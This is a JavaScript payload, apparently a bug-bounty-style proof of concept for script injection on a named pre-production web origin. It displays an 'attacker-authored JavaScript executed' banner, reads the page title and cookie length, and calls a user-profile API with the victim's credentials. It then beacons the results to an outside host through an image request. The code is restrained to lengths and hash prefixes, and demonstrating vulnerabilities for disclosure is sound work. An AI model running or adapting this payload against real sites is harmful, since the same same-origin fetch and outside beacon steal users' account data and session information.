(() => {
  "use strict";

  if (location.origin !== "https://exchange.pre.verily.com") return;
  if (window.__exchangeExternalScriptProof) return;

  const marker = "silver-lantern-83f1c2";
  const endpoint = "/api/user/api/organizations/v2/users/self";
  const result = {
    marker,
    origin: location.origin,
    title: document.title,
    cookieLength: document.cookie.length,
    apiStatus: 0,
    apiLength: 0,
    apiHashPrefix: "pending",
  };
  window.__exchangeExternalScriptProof = result;

  const banner = document.createElement("pre");
  banner.id = marker;
  Object.assign(banner.style, {
    position: "fixed",
    inset: "12px 12px auto 12px",
    zIndex: "2147483647",
    margin: "0",
    padding: "18px",
    whiteSpace: "pre-wrap",
    background: "#12372a",
    color: "#ffffff",
    border: "4px solid #4ade80",
    font: "700 18px/1.4 system-ui, sans-serif",
  });

  const draw = () => {
    banner.textContent = [
      "ATTACKER-AUTHORED JAVASCRIPT EXECUTED",
      `Origin: ${result.origin}`,
      `DOM title read: ${result.title}`,
      `Readable cookie bytes: ${result.cookieLength}`,
      `Same-origin API status: ${result.apiStatus || "pending"}`,
      `Same-origin response bytes: ${result.apiLength}`,
      `Same-origin response SHA-256 prefix: ${result.apiHashPrefix}`,
    ].join("\n");
  };

  const digestPrefix = async (value) => {
    const digest = await crypto.subtle.digest(
      "SHA-256",
      new TextEncoder().encode(value),
    );
    return [...new Uint8Array(digest)]
      .map((part) => part.toString(16).padStart(2, "0"))
      .join("")
      .slice(0, 12);
  };

  const signal = () => {
    const query = new URLSearchParams({
      marker,
      origin: result.origin,
      title: result.title,
      cookieLength: String(result.cookieLength),
      apiStatus: String(result.apiStatus),
      apiLength: String(result.apiLength),
      apiHashPrefix: result.apiHashPrefix,
    });
    const image = new Image();
    image.src = `https://img.defyourtype.com/r/silver-lantern-83f1c2.gif?${query}`;
  };

  document.body.appendChild(banner);
  draw();

  fetch(endpoint, { credentials: "include" })
    .then(async (response) => {
      const body = await response.text();
      result.apiStatus = response.status;
      result.apiLength = body.length;
      result.apiHashPrefix = await digestPrefix(body);
    })
    .catch((error) => {
      result.apiStatus = -1;
      result.apiHashPrefix = error?.name || "Error";
    })
    .finally(() => {
      draw();
      signal();
    });
})();
